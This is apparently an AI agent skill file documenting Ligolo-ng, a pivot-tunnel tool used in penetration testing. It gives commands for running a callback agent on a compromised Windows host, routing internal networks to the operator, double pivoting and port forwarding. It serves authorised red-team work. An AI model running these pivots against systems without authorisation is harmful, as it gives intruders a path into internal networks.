---
name: ligolo-ng
description: "Ligolo-ng — agent-based pivot tunnel that creates a TUN interface on the operator side: no SOCKS proxy, no port forwarding per service — the target network becomes directly routable. Use as the 2025-2026 standard replacement for chisel/ssh -D pivots when the target is Windows or you need direct socket access."
license: MIT
compatibility: "Go binary; agent runs on Windows/Linux/macOS x64/ARM64; proxy (operator side) on Linux/macOS/Windows. Requires TUN interface (/dev/net/tun on Linux, wintun.dll on Windows)."
metadata:
  author: AeonDave
  version: "1.0"
---

# Ligolo-ng

Agent-based pivot: a lightweight agent on the compromised host connects back to the operator's proxy, which creates a **TUN interface** — the target's internal network becomes directly routable from the operator machine. No SOCKS configuration, no per-service port forwards, no `proxychains`.

## Core workflow

```bash
# Operator side (attacker machine)
ligolo-ng-proxy -selfcert -laddr 0.0.0.0:11601

# Target side (compromised host — Windows)
ligolo-ng-agent.exe -connect <operator-ip>:11601 -ignore-cert

# Add the target network route on the operator machine
sudo ip route add 10.10.10.0/24 dev ligolo
# Now directly: nmap 10.10.10.5, curl http://10.10.10.5:8080, impacket, etc.
```

## Best practice

- **Interface setup per OS**: Linux — `sudo ip tuntap add user <user> mode tun ligolo` + `sudo ip link set ligolo up`. Windows — run proxy as admin (loads wintun.dll).
- **Double pivoting**: chain agents — the second agent connects via the first's TUN (`-connect 10.10.10.5:11601` from the first pivot). Each layer adds a new TUN interface with a different name.
- **Port forward mode** (when TUN isn't possible): `listener_add --addr 0.0.0.0:1234 --to 10.10.10.5:3389` from the interactive ligolo session.
- Use `-ignore-cert` only in lab; on real engagements, selfcert works fine since the agent is the trust anchor.

## Gotchas

- The agent binary is ~10 MB — on constrained targets, compress or use `ligolo-ng-agent` built with `-ldflags="-s -w"`.
- TUN interface requires admin/root on the operator machine only (the agent runs unprivileged on the target).
- DNS resolution does not pass through the tunnel by default — use `--dns` flag on the proxy or resolve locally before routing.
- Loopback traffic on the target (e.g. accessing 127.0.0.1 services on the remote host) requires a local relay: `listener_add --addr 127.0.0.1:8080 --to 127.0.0.1:8080` from the ligolo session.

## References

- Upstream: [nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng) (Nicolas Chatelain)
- Companions: `chisel` (SOCKS alternative when TUN is unavailable), `socat` (manual relay), `ssh-tunneling` (SSH-based pivots)
